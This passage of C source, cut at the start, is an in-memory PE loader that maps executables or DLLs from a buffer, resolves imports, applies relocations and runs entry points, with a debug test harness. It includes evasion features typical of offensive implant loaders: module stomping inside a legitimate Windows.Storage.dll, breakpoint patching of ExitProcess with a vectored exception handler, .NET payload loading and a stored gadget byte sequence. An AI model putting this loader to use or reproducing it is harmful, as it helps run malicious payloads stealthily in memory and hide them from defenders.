
    if (sectionData->characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
        protect |= PAGE_NOCACHE;
    }

    // change memory access flags
    if (MM_VirtualProtect(inst, sectionData->address, sectionData->size, protect, &oldProtect) == 0) 
    {
        return FALSE;
    }

    return TRUE;
}


static inline BOOL FinalizeSections(INSTANCE* inst, PMEMORYMODULE module)
{
    int i;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
#ifdef _WIN64
    // "PhysicalAddress" might have been truncated to 32bit above, expand to
    // 64bits again.
    uintptr_t imageOffset = ((uintptr_t) module->headers->OptionalHeader.ImageBase & 0xffffffff00000000);
#else
    static const uintptr_t imageOffset = 0;
#endif
    SECTIONFINALIZEDATA sectionData;
    sectionData.address = (LPVOID)((uintptr_t)section->Misc.PhysicalAddress | imageOffset);
    sectionData.alignedAddress = AlignAddressDown(sectionData.address, module->pageSize);
    sectionData.size = GetRealSectionSize(module, section);
    sectionData.characteristics = section->Characteristics;
    sectionData.last = FALSE;
    section++;

    // loop through all sections and change access flags
    for (i=1; i<module->headers->FileHeader.NumberOfSections; i++, section++) 
    {
        LPVOID sectionAddress = (LPVOID)((uintptr_t)section->Misc.PhysicalAddress | imageOffset);
        LPVOID alignedAddress = AlignAddressDown(sectionAddress, module->pageSize);
        SIZE_T sectionSize = GetRealSectionSize(module, section);
        // Combine access flags of all sections that share a page
        // TODO(fancycode): We currently share flags of a trailing large section
        //   with the page of a first small section. This should be optimized.
        if (sectionData.alignedAddress == alignedAddress || (uintptr_t) sectionData.address + sectionData.size > (uintptr_t) alignedAddress) 
        {
            // Section shares page with previous
            if ((section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0 || (sectionData.characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) 
            {
                sectionData.characteristics = (sectionData.characteristics | section->Characteristics) & ~IMAGE_SCN_MEM_DISCARDABLE;
            } 
            else 
            {
                sectionData.characteristics |= section->Characteristics;
            }
            sectionData.size = (((uintptr_t)sectionAddress) + ((uintptr_t) sectionSize)) - (uintptr_t) sectionData.address;
            continue;
        }

        if (!FinalizeSection(inst, module, &sectionData)) 
        {
            return FALSE;
        }
        sectionData.address = sectionAddress;
        sectionData.alignedAddress = alignedAddress;
        sectionData.size = sectionSize;
        sectionData.characteristics = section->Characteristics;
    }
    sectionData.last = TRUE;
    if (!FinalizeSection(inst, module, &sectionData)) 
    {
        return FALSE;
    }
    return TRUE;
}


static inline BOOL ExecuteTLS(INSTANCE* inst, PMEMORYMODULE module)
{
    unsigned char *codeBase = module->codeBase;
    PIMAGE_TLS_DIRECTORY tls;
    PIMAGE_TLS_CALLBACK* callback;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
    if (directory->VirtualAddress == 0) 
    {
        return TRUE;
    }

    tls = (PIMAGE_TLS_DIRECTORY) (codeBase + directory->VirtualAddress);
    callback = (PIMAGE_TLS_CALLBACK *) tls->AddressOfCallBacks;
    if (callback) 
    {
        while (*callback) 
        {
            (*callback)((LPVOID) codeBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }
    }
    return TRUE;
}


static inline BOOL PerformBaseRelocation(PMEMORYMODULE module, ptrdiff_t delta)
{
    unsigned char *codeBase = module->codeBase;
    PIMAGE_BASE_RELOCATION relocation;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (directory->Size == 0) 
	{
        return (delta == 0);
    }

    relocation = (PIMAGE_BASE_RELOCATION) (codeBase + directory->VirtualAddress);
    for (; relocation->VirtualAddress > 0; ) 
    {
        DWORD i;
        unsigned char *dest = codeBase + relocation->VirtualAddress;
        unsigned short *relInfo = (unsigned short*) OffsetPointer(relocation, IMAGE_SIZEOF_BASE_RELOCATION);
        for (i=0; i<((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++) {
            // the upper 4 bits define the type of relocation
            int type = *relInfo >> 12;
            // the lower 12 bits define the offset
            int offset = *relInfo & 0xfff;

            switch (type)
            {
            case IMAGE_REL_BASED_ABSOLUTE:
                // skip relocation
                break;

            case IMAGE_REL_BASED_HIGHLOW:
                // change complete 32 bit address
                {
                    DWORD *patchAddrHL = (DWORD *) (dest + offset);
                    *patchAddrHL += (DWORD) delta;
                }
                break;

#ifdef _WIN64
            case IMAGE_REL_BASED_DIR64:
                {
                    ULONGLONG *patchAddr64 = (ULONGLONG *) (dest + offset);
                    *patchAddr64 += (ULONGLONG) delta;
                }
                break;
#endif

            default:
                //printf("Unknown relocation: %d\n", type);
                break;
            }
        }

        // advance to next relocation block
        relocation = (PIMAGE_BASE_RELOCATION) OffsetPointer(relocation, relocation->SizeOfBlock);
    }
    return TRUE;
}


static inline BOOL BuildImportTable(INSTANCE* inst, PMEMORYMODULE module)
{
    unsigned char *codeBase = module->codeBase;
    PIMAGE_IMPORT_DESCRIPTOR importDesc;
    BOOL result = TRUE;

    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (directory->Size == 0) 
    {
        return TRUE;
    }

    importDesc = (PIMAGE_IMPORT_DESCRIPTOR) (codeBase + directory->VirtualAddress);

    // It's null-terminated (i.e., last entry has Name == 0)
    for (; importDesc->Name; importDesc++)
    {
        uintptr_t *thunkRef;
        FARPROC *funcRef;
        HCUSTOMMODULE *tmp;
        HCUSTOMMODULE handle = MM_LoadLibraryA(inst, (LPCSTR) (codeBase + importDesc->Name));
        if (handle == NULL) 
        {
            result = FALSE;
            break;
        }

        SIZE_T newCount = module->numModules + 1;
        SIZE_T newSize = newCount * sizeof(HCUSTOMMODULE);

        if (module->modules == NULL) 
        {
            tmp = (HCUSTOMMODULE *) MM_VirtualAlloc(inst, NULL, newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        } 
        else 
        {
            tmp = (HCUSTOMMODULE *) MM_VirtualAlloc(inst, NULL, newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (tmp != NULL) 
            {
                SIZE_T oldSize = module->numModules * sizeof(HCUSTOMMODULE);
                memcpy(tmp, module->modules, oldSize);
                MM_VirtualFree(inst, module->modules, 0, MEM_RELEASE);
            }
        }
		
        if (tmp == NULL) 
		{
            result = FALSE;
            break;
        }
        module->modules = tmp;

        module->modules[module->numModules++] = handle;
        if (importDesc->OriginalFirstThunk) 
        {
            thunkRef = (uintptr_t *) (codeBase + importDesc->OriginalFirstThunk);
            funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
        } 
        else 
        {
            // no hint table
            thunkRef = (uintptr_t *) (codeBase + importDesc->FirstThunk);
            funcRef = (FARPROC *) (codeBase + importDesc->FirstThunk);
        }
        for (; *thunkRef; thunkRef++, funcRef++) 
        {
            if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) 
            {
                *funcRef = MM_GetProcAddress(inst, handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
            } 
            else 
            {
                PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME) (codeBase + (*thunkRef));
                *funcRef = MM_GetProcAddress(inst, handle, (LPCSTR)&thunkData->Name);
            }
            if (*funcRef == 0) 
            {
                result = FALSE;
                break;
            }
        }

        if (!result)
        {
            break;
        }
    }

    return result;
}


HMEMORYMODULE MemoryLoadLibrary(INSTANCE* inst, const void *data, size_t size)
{
    PMEMORYMODULE result = NULL;
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS old_header;
    unsigned char *code, *headers;
    ptrdiff_t locationDelta;
    PIMAGE_SECTION_HEADER section;
    DWORD i;
    size_t optionalSectionSize;
    size_t lastSectionEnd = 0;
    size_t alignedImageSize;

    if (!CheckSize(size, sizeof(IMAGE_DOS_HEADER))) 
        return NULL;

    dos_header = (PIMAGE_DOS_HEADER)data;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    if (!CheckSize(size, dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS))) 
        return NULL;
    
    old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
    if (old_header->Signature != IMAGE_NT_SIGNATURE) 
        return NULL;

    if (old_header->FileHeader.Machine != HOST_MACHINE) 
        return NULL;

    if (old_header->OptionalHeader.SectionAlignment & 1) 
        return NULL;
	
    section = IMAGE_FIRST_SECTION(old_header);
    optionalSectionSize = old_header->OptionalHeader.SectionAlignment;
    for (i=0; i<old_header->FileHeader.NumberOfSections; i++, section++) 
    {
        size_t endOfSection;
        if (section->SizeOfRawData == 0) 
        {
            // Section without data in the DLL
            endOfSection = section->VirtualAddress + optionalSectionSize;
        } 
        else 
        {
            endOfSection = section->VirtualAddress + section->SizeOfRawData;
        }

        if (endOfSection > lastSectionEnd) 
        {
            lastSectionEnd = endOfSection;
        }
    }

    alignedImageSize = AlignValueUp(old_header->OptionalHeader.SizeOfImage, 0x1000);
    if (alignedImageSize != AlignValueUp(lastSectionEnd, 0x1000)) 
        return NULL;
    
    if(inst->isModuleStompingUsed==0)
    {
        // reserve memory for image of library
        // XXX: is it correct to commit the complete memory region at once?
        //      calling DllEntry raises an exception if we don't...
        code = (unsigned char *)MM_VirtualAlloc(inst, (LPVOID)(old_header->OptionalHeader.ImageBase), alignedImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (code == NULL) 
        {
            // try to allocate memory at arbitrary position
            code = (unsigned char *)MM_VirtualAlloc(inst, NULL, alignedImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (code == NULL) 
                return NULL;
        }
    }
    else
    {
        //
        // module stomping
        //
        HMODULE victimLib = MM_LoadLibraryA(inst, (char*)inst->sModuleToStomp);
        char * ptr = (char *) victimLib + 4096*2;

        DWORD oldprotect = 0;		
        int ret = MM_VirtualProtect(inst, (char *)ptr, alignedImageSize+4096, PAGE_READWRITE, &oldprotect);
        __stosb(ptr, 0, alignedImageSize + 4096);
        
        code = ptr;
    }

    result = (PMEMORYMODULE) MM_VirtualAlloc(inst, NULL, sizeof(MEMORYMODULE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (result == NULL) 
        return NULL;

    result->codeBase = code;
    result->inst = inst;
    result->isDLL = (old_header->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    result->pageSize = 0x1000;

    if (!CheckSize(size, old_header->OptionalHeader.SizeOfHeaders))
        return NULL;

    // commit memory for headers
    headers = code;

    // copy PE header to code
	for(int indxi=0; indxi<old_header->OptionalHeader.SizeOfHeaders; indxi++)
		headers[indxi] = ((char*)dos_header)[indxi];

    result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];

    // update position
    result->headers->OptionalHeader.ImageBase = (uintptr_t)code;
	
    // copy sections from DLL file block to new memory location
    if (!CopySections(inst, (const unsigned char *) data, size, old_header, result)) 
	    return NULL;

    // adjust base address of imported data
    locationDelta = (ptrdiff_t)(result->headers->OptionalHeader.ImageBase - old_header->OptionalHeader.ImageBase);
    if (locationDelta != 0) 
	{
        result->isRelocated = PerformBaseRelocation(result, locationDelta);
    } 
	else 
	{
        result->isRelocated = TRUE;
    }
		
    // load required dlls and adjust function table of imports
    if (!BuildImportTable(inst, result)) 
	    return NULL;
	
    // mark memory pages depending on section headers and release
    // sections that are marked as "discardable"
    if (!FinalizeSections(inst, result)) 
        return NULL;
	
    // TLS callbacks are executed BEFORE the main loading
    if (!ExecuteTLS(inst, result)) 
        return NULL;

    //
    // Add function table for stack unwinding
    //

    // __debugbreak();

    DWORD functionCount = result->pdataSize / sizeof(RUNTIME_FUNCTION);
    inst->api.RtlAddFunctionTable(result->pdataStart, functionCount, (DWORD64)result->codeBase);

    // get entry point of loaded library	
    if (result->headers->OptionalHeader.AddressOfEntryPoint != 0) 
    {
        if (result->isDLL) {
            DllEntryProc DllEntry = (DllEntryProc)(LPVOID)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
            // notify library about attaching to process
            BOOL successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
            if (!successfull)
                return NULL;

            result->initialized = TRUE;
        } 
        else 
        {
            result->exeEntry = (ExeEntryProc)(LPVOID)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
        }
    }
    else 
    {
        result->exeEntry = NULL;
    }

    return (HMEMORYMODULE)result;
}


static int _compare(const void *a, const void *b)
{
    const struct ExportNameEntry *p1 = (const struct ExportNameEntry*) a;
    const struct ExportNameEntry *p2 = (const struct ExportNameEntry*) b;
    return strcmp(p1->name, p2->name);
}


static int _find(const void *a, const void *b)
{
    LPCSTR *name = (LPCSTR *) a;
    const struct ExportNameEntry *p = (const struct ExportNameEntry*) b;
    return strcmp(*name, p->name);
}


#ifdef _M_X64
#define IP Rip
#else
#define IP Eip
#endif

static BOOL PutInt3(INSTANCE* inst, LPBYTE target, BYTE* saved)
{
    if (!inst || !target || !saved)
        return FALSE;

    DWORD oldProtect = 0;
    if (!MM_VirtualProtect(inst, target, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    *saved = *target;
    *target = 0xCC;

    HANDLE process = MM_GetCurrentProcess(inst);
    if (process)
        MM_FlushInstructionCache(inst, process, target, 1);

    MM_VirtualProtect(inst, target, 1, oldProtect, &oldProtect);
    return TRUE;
}

static void RestoreByte(INSTANCE* inst, LPBYTE target, BYTE saved)
{
    if (!inst || !target)
        return;

    DWORD oldProtect = 0;
    if (!MM_VirtualProtect(inst, target, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
        return;

    *target = saved;

    HANDLE process = MM_GetCurrentProcess(inst);
    if (process)
        MM_FlushInstructionCache(inst, process, target, 1);

    MM_VirtualProtect(inst, target, 1, oldProtect, &oldProtect);
}

static LONG CALLBACK VehExitTrap(PEXCEPTION_POINTERS p)
{
    if (!p || p->ExceptionRecord->ExceptionCode != EXCEPTION_BREAKPOINT)
        return EXCEPTION_CONTINUE_SEARCH;

    INSTANCE* inst = MmGetThreadInstance();
    if (!inst)
        return EXCEPTION_CONTINUE_SEARCH;

    EXIT_VEH_CONTEXT* ctx = &inst->exitVehContext;
    void* addr = p->ExceptionRecord->ExceptionAddress;
    if (addr == ctx->k32ExitProcess || addr == ctx->ntdllExitUserProcess) {
        p->ContextRecord->IP = (DWORD_PTR)AfterExeContinuation;

#ifdef DEBUG_OUTPUT
        printf("VehExitTrap\n");
#endif

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}


static BOOL InstallExitVEH(INSTANCE* inst)
{
#ifdef DEBUG_OUTPUT
    printf("InstallExitVEH\n");
#endif

    if (!inst)
        return FALSE;

    EXIT_VEH_CONTEXT* ctx = &inst->exitVehContext;

    if (ctx->vehHandle)
        return TRUE;

    if (!inst->api.VirtualProtect || !inst->api.AddVectoredExceptionHandler ||
        !inst->api.RemoveVectoredExceptionHandler || !inst->api.ExitThread ||
        !inst->api.ExitProcess || !inst->api.FlushInstructionCache ||
        !inst->api.GetCurrentProcess)
        return FALSE;

    ctx->previousArbitraryUserPointer = MmReadArbitraryUserPointer();
    ctx->hasPreviousArbitraryUserPointer = 1;
    MmWriteArbitraryUserPointer(inst);

    HMODULE k32 = MM_GetModuleHandleA(inst, (char*)inst->sKernel32DLL);
    HMODULE ntd = MM_GetModuleHandleA(inst, (char*)inst->sNtDLL);
    if (!k32 || !ntd)
        goto Failure;

    ctx->k32ExitProcess = (LPBYTE)MM_GetProcAddress(inst, k32, (char*)inst->sExitProcess);
    ctx->ntdllExitUserProcess = (LPBYTE)MM_GetProcAddress(inst, ntd, (char*)inst->sRtlExitUserProcess);
    if (!ctx->k32ExitProcess || !ctx->ntdllExitUserProcess)
        goto Failure;

    if (!PutInt3(inst, ctx->k32ExitProcess, &ctx->savedK32Byte))
        goto Failure;
    if (!PutInt3(inst, ctx->ntdllExitUserProcess, &ctx->savedNtdllByte))
    {
        RestoreByte(inst, ctx->k32ExitProcess, ctx->savedK32Byte);
        goto Failure;
    }

    ctx->vehHandle = MM_AddVectoredExceptionHandler(inst, 1, VehExitTrap);

    if (!ctx->vehHandle)
    {
        RestoreByte(inst, ctx->k32ExitProcess, ctx->savedK32Byte);
        RestoreByte(inst, ctx->ntdllExitUserProcess, ctx->savedNtdllByte);
        goto Failure;
    }

#ifdef DEBUG_OUTPUT
    printf("InstallExitVEH OK\n");
#endif
    return TRUE;

Failure:
    if (ctx->hasPreviousArbitraryUserPointer)
    {
        MmWriteArbitraryUserPointer(ctx->previousArbitraryUserPointer);
        ctx->previousArbitraryUserPointer = NULL;
        ctx->hasPreviousArbitraryUserPointer = 0;
    }
    ctx->k32ExitProcess = NULL;
    ctx->ntdllExitUserProcess = NULL;
    ctx->vehHandle = NULL;
    return FALSE;
}

static void RemoveExitVEH(INSTANCE* inst)
{
    if (!inst)
        return;

    EXIT_VEH_CONTEXT* ctx = &inst->exitVehContext;

    if (ctx->vehHandle) {
        MM_RemoveVectoredExceptionHandler(inst, ctx->vehHandle);
        ctx->vehHandle = NULL;
    }

    if (ctx->k32ExitProcess) {
        RestoreByte(inst, ctx->k32ExitProcess, ctx->savedK32Byte);
        ctx->k32ExitProcess = NULL;
    }

    if (ctx->ntdllExitUserProcess) {
        RestoreByte(inst, ctx->ntdllExitUserProcess, ctx->savedNtdllByte);
        ctx->ntdllExitUserProcess = NULL;
    }

    if (ctx->hasPreviousArbitraryUserPointer) {
        MmWriteArbitraryUserPointer(ctx->previousArbitraryUserPointer);
        ctx->previousArbitraryUserPointer = NULL;
        ctx->hasPreviousArbitraryUserPointer = 0;
    }
}

static DWORD HandleExitBehavior(void)
{
#ifdef DEBUG_OUTPUT
        printf("HandleExitBehavior\n");
#endif

    INSTANCE* inst = MmGetThreadInstance();
    if (!inst)
        return 0;

    RemoveExitVEH(inst);

#ifdef DEBUG_OUTPUT
    printf("RemoveExitVEH\n");
#endif

    BYTE mode = inst->exitMode;
    if (mode != 2 && mode != 3)
        mode = 1;

#ifdef DEBUG_OUTPUT
    printf("mode %u\n", mode);
#endif

    if (mode == 3) {
        for (;;) {
            MM_Sleep(inst, 1000);
        }
    }

    if (mode == 2) {
        MM_ExitProcess(inst, 0);
    } else {
        MM_ExitThread(inst, 0);
    }

    return 0;
}

static DWORD WINAPI AfterExeContinuation(LPVOID parameter)
{
    (void)parameter;
    return HandleExitBehavior();
}

static inline int MemoryCallEntryPoint(HMEMORYMODULE mod)
{
    PMEMORYMODULE module = (PMEMORYMODULE)mod;

    if (module == NULL || module->isDLL || module->exeEntry == NULL || !module->isRelocated || !module->inst)
    {
        return -1;
    }

    if (!InstallExitVEH(module->inst))
        return -2;

    module->exeEntry();

    HandleExitBehavior();
    return 0;
}


#define DEFAULT_LANGUAGE        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)


int strCmp(const char* s1, const char* s2)
{
    while (*s1 && (*s1 == *s2))
    {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}


FARPROC MemoryGetProcAddress(INSTANCE* inst, HMEMORYMODULE mod, LPCSTR name)
{	
    PMEMORYMODULE module = (PMEMORYMODULE)mod;
    unsigned char *codeBase = module->codeBase;
    DWORD idx = 0;
    PIMAGE_EXPORT_DIRECTORY exports;
    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_EXPORT);
    if (directory->Size == 0) 
    {
        // no export table found
        return NULL;
    }

    exports = (PIMAGE_EXPORT_DIRECTORY) (codeBase + directory->VirtualAddress);
    if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0) 
    {
        // DLL doesn't export anything
        return NULL;
    }

    if (HIWORD(name) == 0)
    {
        // load function by ordinal value
        if (LOWORD(name) < exports->Base) 
        {
            return NULL;
        }
		
        idx = LOWORD(name) - exports->Base;
    }
    else if (!exports->NumberOfNames) 
	{
        return NULL;
    } 
	else 
	{
        const struct ExportNameEntry *found;

        // Lazily build name table and sort it by names
        if (!module->nameExportsTable) 
        {
            DWORD i;
            DWORD *nameRef = (DWORD *) (codeBase + exports->AddressOfNames);
            WORD *ordinal = (WORD *) (codeBase + exports->AddressOfNameOrdinals);
            struct ExportNameEntry *entry = (struct ExportNameEntry*) MM_VirtualAlloc(inst, NULL, exports->NumberOfNames * sizeof(struct ExportNameEntry),	MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);		
		
            module->nameExportsTable = entry;
            if (!entry) 
			{
                return NULL;
            }
            for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++, entry++) 
            {
                entry->name = (const char *) (codeBase + (*nameRef));
                entry->idx = *ordinal;
            }            
        } 

        for (int ii = 0; ii < exports->NumberOfNames; ii++)
        {
            if (strCmp(module->nameExportsTable[ii].name, name) == 0)
                found = &module->nameExportsTable[ii];
        }
		
        // search function name in list of exported names with binary search

        if (!found) 
        {
            // exported symbol not found
            return NULL;
        }

        idx = found->idx;
    }

    if (idx > exports->NumberOfFunctions) 
    {
        // name <-> ordinal number don't match
        return NULL;
    }

    // AddressOfFunctions contains the RVAs to the "real" functions
    return (FARPROC)(LPVOID)(codeBase + (*(DWORD *) (codeBase + exports->AddressOfFunctions + (idx*4))));
}

#ifdef DEBUG_OUTPUT


int testGenric(char* peFilename1, int isDll, char* methodeName, int isDotNet, char* cmdLine)
{			
    printf("[ ] testGenric %s %d %s %d %s\n", peFilename1, isDll, methodeName, isDotNet, cmdLine);

    INSTANCE* inst;
	inst = (INSTANCE*)calloc(1, sizeof(INSTANCE));

    printf("[ ] Instance size: %zu\n", sizeof(INSTANCE));

	strncat((char*)inst->sGetProcAddress, "GetProcAddress", 14);
	strncat((char*)inst->sGetModuleHandleA, "GetModuleHandleA", 16);
	strncat((char*)inst->sLoadLibraryA, "LoadLibraryA", 12);
	strncat((char*)inst->sVirtualAlloc, "VirtualAlloc", 12);
	strncat((char*)inst->sVirtualFree, "VirtualFree", 11);
	strncat((char*)inst->sVirtualProtect, "VirtualProtect", 14);
	strncat((char*)inst->sRtlLookupFunctionEntry, "RtlLookupFunctionEntry", 22);
	strncat((char*)inst->sBaseThreadInitThunk, "BaseThreadInitThunk", 19);
	strncat((char*)inst->sRtlUserThreadStart, "RtlUserThreadStart", 18);
	strncat((char*)inst->sGetCommandLineA, "GetCommandLineA", 15);
	strncat((char*)inst->sGetCommandLineW, "GetCommandLineW", 15);
    strncat((char*)inst->sRtlAddFunctionTable, "RtlAddFunctionTable", 19);
    strncat((char*)inst->sSleep, "Sleep", 5);
    strncat((char*)inst->sAddVectoredExceptionHandler, "RtlAddVectoredExceptionHandler", 30);
    strncat((char*)inst->sRemoveVectoredExceptionHandler, "RtlRemoveVectoredExceptionHandler", 33);
    strncat((char*)inst->sExitThread, "ExitThread", 10);
    strncat((char*)inst->sExitProcess, "ExitProcess", 11);
    strncat((char*)inst->sFlushInstructionCache, "FlushInstructionCache", 21);
    strncat((char*)inst->sGetCurrentProcess, "GetCurrentProcess", 17);
    strncat((char*)inst->sRtlExitUserProcess, "RtlExitUserProcess", 18);

    inst->exitMode = 3;

	strncat((char*)inst->sKernel32DLL, "kernel32.dll", 12);
	strncat((char*)inst->sKernelBaseDLL, "kernelbase.dll", 14);
	strncat((char*)inst->sNtDLL, "ntdll.dll", 9);
	wcsncat((wchar_t*)inst->wsKernel32DLL, L"KERNEL32.DLL", 12);

    strncat((char*)inst->sMsvcrtDLL, "msvcrt.dll", 10);
    strncat((char*)inst->sPrintf, "printf", 6);
    strncat((char*)inst->sDebug, "debug\n", 7);

    strncat((char*)inst->sDataSec, ".data", 5);
    strncat((char*)inst->sPDataSec, ".pdata", 6);
    strncat((char*)inst->sGadget, "\xFF\x23", 2);

    inst->isModuleStompingUsed=1;
	strncat((char*)inst->sModuleToStomp, "Windows.Storage.dll", 19);


    // Load module in memory
    FILE *peFile = fopen(peFilename1, "rb");
	fseek(peFile, 0, SEEK_END);
	long peFileSize = ftell(peFile);
	fseek(peFile, 0, SEEK_SET);
	
    void* peBuffer = VirtualAlloc(NULL, peFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	fread(peBuffer , peFileSize, 1, peFile);
	fclose(peFile);	

    printf("[ ] Executable file: %s\n", peFilename1);
    printf("[ ] Executable size: %ld\n", peFileSize);

    if(isDll && isDotNet)
    {
        printf("[!] Cannot use both isDll and isDotNet at the same time\n");
        return -1;
    }

    if(!isDll)
    {
        inst->isDll = 0;
    }
    else
    {
        inst->isDll = 1;
        strncat((char*)inst->sdllMethode, methodeName, strlen(methodeName));
    }

    if(isDotNet)
    {
        inst->isDotNet = 1;

        // Load module in memory
        FILE *peDotNetLoader= fopen(".\\goodClr.dll", "rb");
        fseek(peDotNetLoader, 0, SEEK_END);
        long peDotNetLoaderSize = ftell(peDotNetLoader);
        fseek(peDotNetLoader, 0, SEEK_SET);
        
        void* peDotNetLoaderBuffer = VirtualAlloc(NULL, peDotNetLoaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        fread(peDotNetLoaderBuffer , peDotNetLoaderSize, 1, peDotNetLoader);
        fclose(peDotNetLoader);	

        inst->ptrModuleTst = peDotNetLoaderBuffer;
        inst->dotnetLoaderSize = peDotNetLoaderSize;
        
        inst->ptrDotNetModuleTst = peBuffer;
        inst->dotnetModuleSize = peFileSize;

        strncat((char*)inst->sdllMethode, "go", 2);

        wchar_t* dst = (wchar_t*)inst->sCmdLine;
        swprintf(dst, 2048, L"%hs", cmdLine);
    }
    else
    {
        inst->isDotNet = 0;
        inst->ptrModuleTst = peBuffer;
        inst->moduleSize = peFileSize;
        inst->ptrDotNetModuleTst = NULL;

        wchar_t* dst = (wchar_t*)inst->sCmdLine;
        swprintf(dst, 2048, L"exe %hs", cmdLine);

        printf("[ ] Command line: %ls\n", dst);
    }


    printf("[+] Loader launch\n");

    Loader(inst);

    printf("[+] Loader end\n");
    
	return 0;
}


int main(int argc, char* argv[])
{
    if (argc < 6) 
    {
        printf("Usage: %s <peFilename> <isDll> <methodName> <isDotNet> <cmdLine>\n", argv[0]);
        return 1;
    }

    char* peFilename1 = argv[1];
    int isDll = atoi(argv[2]);          // Convert string to int (0 or 1)
    char* methodeName = argv[3];
    int isDotNet = atoi(argv[4]);       // Convert string to int (0 or 1)
    char* cmdLine = argv[5];

    return testGenric(peFilename1, isDll, methodeName, isDotNet, cmdLine);
}


#endif